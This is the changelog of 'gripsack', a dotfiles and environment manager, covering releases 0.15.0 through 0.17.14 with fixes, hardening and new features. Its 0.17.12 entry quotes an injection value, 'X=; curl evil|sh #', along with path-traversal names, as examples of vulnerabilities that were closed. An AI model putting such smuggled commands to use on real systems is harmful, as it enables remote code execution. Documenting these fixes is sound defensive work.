# Changelog

User-visible changes per release. Design archaeology lives in
`plan/`; this file is for "what's new for me".

## [0.17.14] — 2026-09-02

From a real two-host migration report and an external review. New
diagnostic E118; no IR schema change.

### Fixed

- **A `steps`-style module was invisible to the lockfile resolver.**
  Converting a module from the declarative style to the class/`steps`
  style — changing nothing else — silently dropped it out of `grip
  update` ("nothing to resolve yet"): it applied unpinned while
  `check`, `plan` and `update` all stayed quiet. The resolver now
  sees a module's single fetch step exactly like its declarative
  `fetch` field, and **E118** refuses a module with several fetch
  steps at check time (the lockfile pins one fetch per module) with
  a hint to split into modules — same-wave modules fetch in
  parallel, so nothing is lost. One consequence of E118: the
  auto-chained multi-fetch DAGs whose install edges could mis-wire
  can no longer be authored silently either.
- **A stale symlink left by an older gripsack blocked the first
  apply after upgrading, forever.** Config deployed straight from
  the checkout in old versions; the containment guard then refused
  any owned destination that still pointed into the repo, with an
  error naming the module instead of the link. An `owned` destination
  that is itself a symlink into the repo is now treated as prior
  state: the normal owned drift guard answers (use `--take-over` to
  replace; the original target is captured as a prior and never
  touched). Write-through modes still refuse — writing would land in
  the checkout — but the error now names the mechanism and the way
  out.
- **`grip update` silently dropped modules outside the host's
  graph.** A probe-gated (or typo'd) name in `grip update a b c`
  vanished — eight asked, seven answered, exit 0. Out-of-graph names
  now report `skipped (not in this host's graph)`; `grip apply`
  refuses them outright.
- **The pinned Deno runtime is now the default.** Resolution used to
  prefer a deno on PATH over the pinned, sha256-verified download —
  two "identical" machines could evaluate through different runtimes
  because one happened to have deno installed. Precedence is now
  `GRIPSACK_DENO` → pinned → PATH (≥ 2, with a run-log warning) only
  when the pinned one is unavailable (musl host, failed download).
  `grip doctor` labels which one answered. Site-managed denos: set
  `GRIPSACK_DENO`.
- **`apply` no longer reports failure after activating.** The
  exported-env profile (`env/profile.sh`) rendered after the
  generation flip; an I/O error there said apply-failed while the
  new generation was already active. It renders before the flip — a
  failure now leaves nothing activated.
- W10's tuicr coverage message says `0.2.x`, not `0.2x` (the latter
  reads as covering anything starting `0.2`).

### Notes

- `update` records `sha256`; `tree256` (the extracted tree's hash)
  is necessarily recorded at the first `apply` on that host — it
  cannot be known before extraction. Split-resolution setups (one
  host resolves, another applies) will see the apply add the field.
- Stranded on ≤ 0.17.9 behind shared egress where `self-update`
  cannot reach the API? Fetch the release tarball directly — the
  same egress allows it:
  `curl -LO https://github.com/gripsack-dev/gripsack/releases/latest/download/gripsack-<version>-<target>.tar.gz`
  (this is also how the 0.17.10+ self-update fix can be reached).


## [0.17.13] — 2026-09-02

Round two: a fresh fuzzing campaign (5,200+ IR mutations, 2,700 argv
runs, eval/store/adopt/tar campaigns), a code-quality review, and
the refactors it justified. No IR schema change.

### Fixed

- **merge blocks could silently corrupt the file they manage.** Block
  detection matched the close marker by substring, so a payload line
  that merely quoted `<<< gripsack <<<` read as the end of the
  block: rollback left the block behind (sometimes with a false
  "modified since deploy" warning), prune appended strays, and every
  re-apply grew the file by another line — unbounded, all rc=0.
  Close markers now carry the module name, marker lines must BE
  marker lines (a quoted marker in content no longer matches), and
  payload lines quoting the banner text no longer fall out of the
  block hash. Existing blocks are found and rewritten with scoped
  markers on the next apply.
- **`grip adopt` on a fifo hung forever** (it "adopted" the fifo,
  then blocked reading it). Special files are refused at inventory
  and at copy: "not a regular file".
- **`fileFetch` on a fifo or a symlink to `/dev/zero` hung the
  read** with no bound. The file fetcher and the canonical hasher
  now refuse non-regular files; symlinked payloads still work.
- **`grip update` could pick a different lockfile than `grip
  apply`.** It re-derived the host from `$HOSTNAME` — a bash-ism
  POSIX sh does not export — ignoring env.toml's `default_host`.
  The evaluated host now travels with the eval outcome and every
  command reuses it.
- **A module whose content was only a build/run step published an
  empty store path.** Publish staged a fresh directory and wiped
  what the step had just produced — apply "succeeded" with the
  artifact gone. Step staging persists now (e2e regression added).
- **The trust gate could erase concurrent trust decisions** (the
  prompt window rewrote the whole file from a pre-prompt snapshot)
  and printed repo paths raw — a path carrying newlines or ANSI
  escapes could forge prompt lines. Trust mutations serialize on a
  flock; prompt values with control characters print escaped.
- A malicious plugin release tag (`a/../../evil`) could walk out of
  the plugin store; tags must be a safe single path segment now.
  `git:` revs are validated before they reach
  `git fetch` (option injection). The throttle's host parser is
  IPv6-literal-aware and shared with the HTTP layer (one URL
  grammar, not two). Downloaded throttle state and plugin receipts
  write through the store's atomic primitives. pixi provisioning
  takes the same flock deno does, and its staging path no longer
  collides across patch releases.
- `grip gc` printed "0.0 B freed" on color terminals but omitted a
  real number when piped; `dir_size` no longer follows symlink
  cycles (a hostile tarball could stack-overflow it); `grip update`
  colors follow the terminal like every other command; empty
  `GRIPSACK_HOME`/`XDG_DATA_HOME` no longer produce CWD-relative
  store paths; a missing generation dir is a loud flip error, not a
  `current` symlink pointing at nothing.

### Changed

- Colors follow the terminal everywhere: the remaining unguarded
  ANSI sites (trust, why-owns, doctor, plan, rollback, init, adopt,
  check, store-verify) route through the palette; piped output is
  plain by construction, not per-call-site discipline.
- Internals, no behavior change: `eval` split into its stages
  (`probe::eval_to_fixpoint`, `frontend::Frontend`,
  `provision_plugins`), the validate pipeline is one function
  (`validated_ir`) shared by check/apply, `apply` takes an options
  struct instead of seven positional arguments, `expand_home` and
  the flock primitive live in gripsack-store (one implementation
  each instead of two/three), and the CLI/exec `render.rs` name
  collision is gone (exec's is `template.rs` — it renders file
  content, not consoles). Lower crates never print: one stray
  eprintln became a run-log warning.


## [0.17.12] — 2026-09-01

A hardening pass: a fuzzing campaign over every CLI flow (IR
mutation, argv, env-repo eval, store/generation corruption) plus a
full audit of all nine crates. New diagnostics E116 (module names)
and E117 (env var names); no IR schema change.

### Fixed

- **`grip store verify --repair` could delete any directory on
  disk.** The manifest's `store_path` was trusted as the delete
  target — a tampered manifest naming, say, `~/project` turned
  `--repair` into `rm -rf` of it. Repair now refuses anything
  outside `$GRIPSACK_HOME/store`, and store-verify takes the apply
  lifecycle lock so it cannot race an in-flight apply.
- **Malformed lockfiles crashed `apply` (panic, exit 101).** A short
  `tree256` pin sliced past its end at store-path construction. Pins
  are validated (64-hex) when the lock is read, and a corrupt lock is
  now a loud error on both `apply` and `update` — never a silent
  reset to "no lock", which used to make `update` rewrite the whole
  file and erase every other module's pin.
- **`store verify` panicked on short manifest hashes** (exit 101);
  tampered manifests now report cleanly, and unreadable generation
  manifests surface as warnings instead of reading as "ok".
- **merge mode into a non-text destination destroyed the file.** A
  binary (or unreadable) dest was read as empty and the managed
  block REPLACED the entire foreign file — 1 KiB of binary became
  128 bytes of markers, silently. Deploy refuses loudly now, and
  rollback leaves such files alone.
- **A failed apply after `--take-over` lost your original file.**
  The run-level rollback removed the deployed symlink but never
  restored the captured prior — the original bytes existed only in
  the prior blob store. Priors are restored first on rollback.
- **Env var names reached `profile.sh` unquoted.** A name like
  `X=; curl evil|sh #` landed raw in a file your shell sources
  (values were quoted; names could not be). E117 rejects non-shell-
  identifier names at eval, and the profile renderer skips them in
  hand-edited manifests.
- **Module names flowed into store path segments unvalidated.** A
  name like `x/../../pwned` walked out of the store directory. E116
  restricts names to letters, digits, `_`, `-`, `.` (no separators,
  no `:`, no leading `.`).
- **The GitHub enterprise token leaked to third-party hosts.**
  `GH_ENTERPRISE_TOKEN` was attached to every request that was not
  github.com — any module tarball URL received the credential. It
  now binds only to the host `GH_HOST`/`GITHUB_HOST` names (the gh
  CLI convention) and attaches nowhere when unset.
- **Downloads that hit the 512 MiB cap were silently truncated and
  extracted.** Hitting the cap is an error now, and xz/gz
  decompression is capped so a compressed bomb cannot balloon in
  RAM before the traversal scan runs.
- **Stuck linters/plugins hung grip forever.** The NDJSON exchanges
  enforced deadlines only between reads: a child that went silent
  (or answered but never exited) blocked forever, a >64 KiB request
  could deadlock both sides, and an endless line could OOM. Deadlines
  are enforced end-to-end (kill + reap), lines cap at 1 MiB, stdin
  is written on a writer thread, and unknown linter severities no
  longer coerce to Error.
- **`steps: [...]` modules bypassed the destination rules.** E102
  (absolute/`~/` destinations) and E111 (duplicate destination)
  walked only the declarative install/config fields; entries inside
  step actions got neither check.
- **Lint engine correctness.** W10 version coverage compares
  numerically instead of by string prefix ("0.14" no longer covers
  "0.140"); unknown `[[array-of-tables]]` sections now get A02;
  JSON/YAML `null` reports "got null" instead of "got string"; `1`
  matches a `1.0` choice; indented multi-char keys report real
  columns; TOML error spans stay accurate past multibyte characters.
- `grip update` colored its output even when piped or `NO_COLOR`
  was set; apply writes lockfile pins as soon as fetches land (the
  "already satisfied" early-return used to skip the write); apply
  reads the previous manifest once instead of three times.

## [0.17.11] — 2026-08-31

### Fixed

- **`grip adopt` on a fresh `grip init` repo generated a host file
  that didn't eval.** The host updater matched the `modules: [`
  example inside the template's header comment and inserted the new
  module entry there; the dangling comma swallowed the import below
  ("Import is not allowed here") and adopt's self-check refused its
  own output. The updater targets the real array now, with a
  regression test against the shipped template.
- The demo tapes run again: fixtures moved off the retired Python
  frontend, the rollback tape passes `--host`, and the demo workflow
  extracts the release tarball before installing it. Demos now
  re-render on every CLI change (path triggers on), including the new
  adopt demo.

## [0.17.10] — 2026-08-31

Regression fixes for 0.17.9, from the same migration report.

### Fixed

- **`git()` fetches are deterministic.** The payload hash covered the
  whole clone including `.git` — whose index caches working-tree
  mtimes — so the same rev hashed differently on every fetch and
  every cold-store apply failed its pin check. The checkout alone is
  the payload now; `.git` never reaches the store.
- **A failed apply no longer leaves placeholder-literal links.** The
  generation manifest recorded the RAW install key, so the mid-graph
  rollback restored destinations to paths like
  `ripgrep-{version}-{target}/rg`. The manifest records the expanded
  key, deploy refuses a key that still contains a placeholder after
  expansion (invariant violation, not a path), and restore never
  writes a dangling symlink.
- **`grip self-update` works on shared egress.** The unauthenticated
  GitHub API rate-limits by source IP; when it fails, self-update
  falls back to the web tier (`releases.atom` → plain download URLs)
  — the same path plain release downloads already take.

## [0.17.9] — 2026-08-31

Hardening from a real two-host migration report.

### Fixed

- **A fetched apply no longer drops pin metadata from the lockfile.**
  Re-fetching against a locked pin rewrote the entry with only the
  content hash, losing `version`, `url`, and `api_url` — the next
  warm-store deploy then failed with an unexpanded `{version}` in
  install keys, and a cold store had to re-resolve through the
  registry API (breaking private GitHub Enterprise mirrors behind
  shared egress).
- **Store publish falls back to a copy across filesystems.** Staging
  lives in `$TMPDIR`; on containers that's routinely a tmpfs while
  the store sits on the overlay, and the hard rename died with a bare
  `Cross-device link`. Publish now copies when rename returns EXDEV,
  and store io errors name both paths.
- **Deploy refuses destinations that resolve inside the env repo.** A
  symlinked destination directory (e.g. a leftover from another
  provisioner) used to land the write inside the checkout — the
  module overwrote its own source.
- **A config tree that gains a file re-pins instead of going stale.**
  The lockfile records the repo overlay hash (`repo256`) alongside
  the tree hash: presence checks compare it, `grip update` reports
  the move as a bump, and deploy no longer falls back to linking the
  repo checkout for sources the store never published (0014 §4).
- **`grip update` resolve errors name the module**, not the registry
  string; pinned git modules report `skipped (pinned by rev)` instead
  of "resolution not supported yet".
- **helix linter pack** knows `[editor.inline-diagnostics]` (24.07+).

### Added

- Probe docs say to gate on a stable system path, never the tool's
  own installed presence (which oscillates).

## [0.17.8] — 2026-08-30

Dead-IR audit: nothing in the schema may exist without an executor.

### Added

- **`run` steps are executable** (0007 §3's middle rung): structured
  argv/env/cwd as data, no shell interpretation, declared outputs
  checked after the run. Previously declared-but-refused — the
  phantom-class the cargo_install removal started.
- **`{arch.x64}` placeholder** (node-style: x64 / arm64) for upstreams
  whose assets use the node naming family.
- Step-form intents execute through the activation adapters — the
  adapters now read the expanded steps (the single source of truth),
  so declarative `activate` fields and class-style intents take the
  same path, exactly once.

## [0.17.7] — 2026-08-30

### Removed

- **`cargo_install` and `make` build kinds** — declared but never
  executable, which is a phantom contract (valid IR the core refuses
  at apply). The IR now carries only what it executes: `custom_shell`
  plus an ephemeral toolchain module covers the same ground;
  `cargo install --locked` in a custom step with declared outputs is
  the documented rust-build form. Reusable build logic belongs to
  builder plugins when reality demands it (0001 §3.1 amended).

## [0.17.6] — 2026-08-30

### Added

- **npm dependencies in env repos**: module code can import packages
  from the repo's own `package.json` + `node_modules` (BYONM) —
  installed by you, evaluated read-only under the same sandbox as
  module code (no env, no network, no subprocesses, no filesystem
  outside the repo). A dependency needing an effect fails loudly at
  eval; that effect belongs in a probe or a fetcher.
- **`grip init` scaffolds the IDE story**: `package.json` (with
  `@gripsack/core` pinned to a compatible major.minor — types for your
  editor and the deliberate pin), `tsconfig.json`, `node_modules/` in
  `.gitignore`, and a fresh `git init`, cargo-init style.

### Fixed

- The eval spawn applies the pin map via `--import-map` instead of
  relying on deno.json discovery — a discovered deno.json project
  would have blocked BYONM forever (and the embedded frontend now
  carries its `package.json`, which is what flips BYONM on).

## [0.17.5] — 2026-08-30

### Fixed

- E115 path validation now covers explicit-steps modules
  (`installStep`/`configStep` entries) and verify paths — the
  declarative-only pass could be routed around by `steps = [...]`.

## [0.17.4] — 2026-08-30

The beautiful-errors sweep (0004 §3 pushed through the stack).

### Added

- **E114 — unknown placeholder**: a mistyped `{sytem}` in a fetch,
  install, or verify string now fails `grip check` with a span at the
  module and an edit-distance suggestion ("did you mean '{system}'?"),
  instead of a 404 at fetch time.

### Fixed

- Apply-time failures are coded, span-labeled diagnostics: a fetch or
  build step failing now renders `error[E301]`/`E302` pointing at the
  module line ("raised here"), replacing bare `error:` lines.
- Resolution errors name the gripsack module, not the registry string
  ("step resolve failed in fish", not "in fish-shell/fish-shell").
- Probe diagnostic codes (E112/E113) moved into the central codes
  module — the placeholder code is E114, no collision.

### Added (path validation — 0016 §D4)

- **E115 — path shape**: source and destination paths validate at
  check time with spans — payload-relative sources reject absolute
  forms, `..`/`.`/empty segments, trailing slashes, backslashes;
  destinations reject `..` escapes and bare `~`/`/`. Placeholders
  validate as opaque single-segment atoms (their values are
  single-segment by construction).
- **Tar traversal is a loud error**: hostile entries (absolute paths,
  `..` escapes) fail extraction naming the entry — the tar crate's
  unpack_in skips them silently otherwise, stranding a partial payload
  (zip extraction was already sanitizing).

## [0.17.3] — 2026-08-30

Platform facts, floating git, and a hardened store
([plan 0016](plan/0016-platform-facts-floating-git-readonly-store.md)).

### Added

- **Platform placeholders in fetch specs**: `{system}` (flake-style
  `x86_64-linux`), `{target}` (rust triple, musl on linux), `{arch}`,
  `{arch.go}` (goreleaser `amd64`), `{os}` — expanded by the core from
  the machine's facts in asset patterns, tarball URLs, and install and
  verify keys. One module now serves every platform; per-host locks
  keep every machine honest.
- **Floating git fetcher**: `git(url)` without a rev resolves the
  remote's default-branch HEAD at lock time, pins the sha into the
  lockfile, and `grip update` moves it — the same float-and-pin
  semantics every other fetcher already had. Inline revs still pin.
- **Read-only store payloads**: files publish with write bits dropped
  — an app rewriting an `owned` config through its symlink gets
  EACCES instead of silently corrupting the store. Directories stay
  writable, so repair/gc/rollback are unaffected.
- Linter packs: yazi theme sections ([app], [indicator], [cmp],
  [spot], [icon], [flavor], …), helix `completion-timeout` +
  `[editor.whitespace]` + `[editor.lsp]`, starship `$schema`, atuin
  `[daemon]` keys — all sourced from current upstream docs.

### Fixed

- Linter diagnostics for unknown sub-tables named the section and
  pointed at the right header line (they said "unknown key" at line 1).
- Version-skew warnings (W10) no longer fire on current versions —
  host lockfiles pin tag-style versions (`v18.20.1`) while packs
  carried bare prefixes (`18.`); packs now carry both forms.
- atuin `search.shells` accepts the documented string default (was a
  live false-positive A04).

## [0.17.2] — 2026-08-29

Dogfood fixes — every one of them caught by running gripsack against a
real, full-sized dotfiles env.

### Fixed

- `store verify` no longer false-positives on `merge` and `template`
  modules: the manifest records the *deploy-output* hash (trimmed
  block, rendered bytes), and verify now recomputes exactly that
  instead of comparing the raw store file (which could never match).
- Package harvest copies symlinks **as symlinks** instead of following
  them — a symlink to a directory (conda's `lib/terminfo →
  share/terminfo`) crashed pixi-module fetches with a pathless io
  error. Note: pixi payload identity changes with this fix; a
  `grip update <module>` re-pins deliberately.
- API auth tokens now survive **same-host redirects** — a transferred
  GitHub repo (`owner/x` → `new-owner/x`) previously re-requested
  anonymously into the rate-limited pool and 403'd. Cross-host
  redirects still strip credentials (the no-leak rule stands).
- Fetch/copy io errors carry the offending path instead of a bare
  "the source path is neither a regular file…".

## [0.17.1] — 2026-08-29

The adopt audit ([plan 0015 §7](plan/0015-grip-adopt.md)): ask, don't
guess; say exactly what you wrote.

### Changed

- **`grip adopt` no longer guesses ownership.** The hardcoded
  app-behavior tables are deleted — they presented folk knowledge as
  detection. Adopt now *asks* with the semantics laid out (arrow-key
  select): `owned` (read-only link, repo is the only editor),
  `tracked_copy` (real file, drift kept — the safe default), `merge`
  (one managed block in a shared file). Non-interactive runs take
  `tracked_copy` with a loud note; `--mode` is the preseed.
- Adopt's plan labels destinations it will absorb as
  "will be adopted (prior recorded)" instead of demanding
  `--take-over`.

### Fixed

- Adopt no longer follows directory symlinks inside the adopted tree —
  a link could pull an arbitrary directory tree into your repo. Such
  links (and broken ones) are skipped and reported.
- Adopt refuses paths outside `$HOME` (plan compliance) and refuses to
  overwrite existing `modules/<name>.ts` / `configs/<name>/` — the
  never-clobber rule covers the repo too.
- Eval-failure and abort messages list exactly what was written and
  how to abandon it (the old message claimed the repo was untouched).
- Host-entrypoint edits are a pure, unit-tested function; a
  single-line `modules: [a]` insertion produced `[ab, ]` before.
- Large adoptions (>25MB) warn and name the largest entries.

### Refactored

- `commands/adopt.rs` (500 lines) split into
  `adopt/{mod,inspect,generate,prompt}.rs` — pure functions at the
  edges, side effects named. The ownership menu uses dialoguer.

## [0.17.0] — 2026-08-28

Constrained evaluation ([plan 0013](plan/0013-constrained-evaluation.md)).
Breaking: the Python frontend, bun, and uv are removed.

### Added

- **Sandboxed eval**: the TypeScript frontend runs under a pinned,
  hash-verified Deno (2.9.6) with deny-by-default capabilities — no
  environment variables, no network, no subprocesses, read-only within
  the repo. First eval downloads the runtime once; `GRIPSACK_DENO`
  overrides. Eval platforms: glibc Linux and macOS (Deno ships no musl
  build; `grip doctor` says so plainly there).
- **Injected facts**: os/arch/libc/hostname are detected in the Rust
  core and passed to eval in a JSON inputs document — no more
  frontend-side self-detection.
- **Probes**: `ctx.probe.executable("nvidia-smi")` /
  `ctx.probe.file_exists(...)` are symbolic requests the core binds in
  a two-stage eval (fixpoint-capped, E112 on instability), recorded in
  the run log and summarized in `grip plan`'s host-inputs header.
- **Trust gate**: the first eval of an unfamiliar repo prompts before
  running its code, naming the exact sandbox capabilities. `grip trust
  list/add/remove` manages the store; `GRIPSACK_TRUST_ALL=1` is the CI
  bypass.
- **`defineEnv`**: host entrypoints are functions —
  `export default defineEnv((ctx) => ({ tags, modules }) )`. `module()`
  is a pure constructor; falsy module entries drop out. Side-effect
  registration is gone.
- The dual-frontend parity corpus is replaced by a golden IR snapshot
  corpus (fixture envs → IR, byte-exact modulo spans).
- **Content-addressed store identity** ([plan 0014](plan/0014-content-addressed-fetches.md)):
  fetch-only and config-only modules name their store path by the
  canonical hash of their content; builds stay input-addressed (their
  output can't be named before it exists — plan-time naming is what
  keeps `grip plan` complete). A mirror swap or URL edit with identical
  bytes re-proves once, then dedups to the same path: no store churn,
  no new generation. Editing an install mapping no longer refetches.
  The lockfile records both hashes: `sha256` (transport integrity of
  the download) and `tree256` (store identity).
- **`grip store verify` is now correct and host-independent**: the
  whole-tree check previously compared a tree hash against the
  transport hash (could never match) under a hostname-keyed lock
  lookup (usually skipped) — the generation manifest now carries
  `tree256`, and a tampered fetched payload fails verify anywhere.
- **`grip adopt <path>`** ([plan 0015](plan/0015-grip-adopt.md)) — the
  adoption flow as a first-class command: inspects the path,
  recommends an ownership mode with the reason stated, generates the
  payload + module + host entry, shows the plan, and touches nothing
  until confirmed. The apply uses **scoped take-over** (absorbs
  exactly the adopted destinations; unrelated drift is never
  clobbered) and records **prior state** for every taken-over
  destination. Rollback — and undeclaring the module — restores your
  original files, bytes and permission bits, drift-guarded against
  your post-adopt edits. On a fresh machine, adopt records an empty
  **generation 0** first, so adoption is always reversible.
- Prior blobs live content-addressed under `$GRIPSACK_HOME/prior/`;
  `gc` collects them with the same reachability rule as store paths.
- Provisioning is serialized across concurrent `grip` runs — two
  racing applies could corrupt each other's Deno download or embedded
  frontend materialization (os error 26/2 under concurrency).
- Symlink deploys report "unchanged" when the link already points at
  the right store path — a re-proved fetch no longer looks like a
  redeploy.

  Migration note: content-addressed paths differ in shape, so the
  first apply after upgrading re-stages fetch/config modules once
  (identical bytes, new names); `grip gc` collects the old paths.

### Removed

- The Python frontend (`pip install gripsack`), the embedded
  zero-provisioning path, `GRIPSACK_PYTHON`, `[eval] deps`, and uv
  provisioning. `frontend = "python"` in env.toml is an E400 with a
  migration hint.
- bun provisioning and `GRIPSACK_BUN`.

## [0.16.4] — 2026-08-28

### Fixed

- `grip self-update` finds the binary inside the real release layout
  (`gripsack-<version>-<triple>/grip`, not a bare root) — 0.16.3's
  self-update reported "no grip binary" against actual releases; the
  e2e fixture now nests identically so the gate catches the shape.
  (0.16.3 self-updaters: run `curl -fsSL https://gripsack.dev/install.sh | sh` once.)

## [0.16.3] — 2026-08-28

### Added

- **`grip self-update`** — a package manager that can update itself.
  Tarball/install.sh installs fetch the newest `core-v` release, verify
  the mandatory sha256 sidecar, and atomically swap the running binary
  (takes effect next launch). brew/cargo/mise installs get their
  manager's command instead. `--check` reports only.
- This changelog, mirrored at
  [gripsack.dev/docs/changelog](https://gripsack.dev/docs/changelog.html).

## [0.16.2] — 2026-08-28

### Added

- **Zero-provisioning bootstrap**: the Python frontend is embedded in
  the binary. A config-only repo applies with zero network and zero
  provisioning, first apply included — `grip` + any `python3` is the
  whole requirement. Repos declaring `[eval] deps` or wheel linters
  still provision a pinned venv on demand.

### Fixed

- Repo-ref linters (`owner/repo@tag`) no longer force frontend
  provisioning; they resolve from the plugin store, not pip.
- `grip doctor` recognizes the embedded frontend.
- The crates.io publish loop publishes `griplint` before
  `gripsack-lint` (retries absorb index lag, not ordering).

## [0.16.1] — 2026-08-27

### Added

- **`grip store verify [--repair]`** — re-hashes every deployed entry
  against the manifest and every store payload against the lockfile's
  pins; `--repair` removes corrupt paths so the next apply re-fetches.
- The dual-frontend golden corpus: one full-surface fixture env
  evaluated through both frontends, IR diffed modulo spans — running in
  the required CI gate.

### Fixed

- Four parity bugs the corpus caught on debut: TypeScript dropped
  `brew(version=)`, env contributions were missing from the TS spec,
  host arch drifted (`x64` vs `x86_64`), and a missing `--host` file
  silently yielded empty tags instead of erroring. A fifth (musl libc
  detection) fell to the docker gate.
- Rollback of template/merge entries restores rendered bytes from the
  manifest's recorded vars; a foreign file's non-managed content
  survives.
- `keep_generations` resolves from the repo, never cwd-sniffing.

## [0.16.0] — 2026-08-27

### Added

- One deploy engine for apply and rollback: destinations are restored
  through the same code path either way.
- `grip plan` diffs against the live generation — modified, pruned, and
  take-over rows, not just the new manifest.

### Fixed

- Identity projection: spans and absolute paths no longer leak into the
  store-path hash, so two machines with identical repos get identical
  paths.
- IR rejects unknown fields; GC fails closed on corrupt manifests;
  `tracked_copy` drift is e2e-pinned.

## [0.15.5] — 2026-08-26

### Added

- Activation adapters: `fonts` (fontconfig cache) and `desktop_entry`
  (desktop database) intents run post-link/post-activate.

## [0.15.0] — 2026-08-25

### Added

- The griplint engine moved in-crate: all 22 config linters run
  in-process from embedded data packs — no venv, no provisioning for
  first-party linters.
- Plugin lifecycle: `package = "owner/repo@tag"` provisions fetcher and
  linter binaries from releases, sha256-verified and receipted.
- TypeScript frontend evaluates through a pinned, provisioned bun.

---

Earlier releases (≤ 0.14.x) predate this file — see
[the release history](https://github.com/gripsack-dev/gripsack/releases).
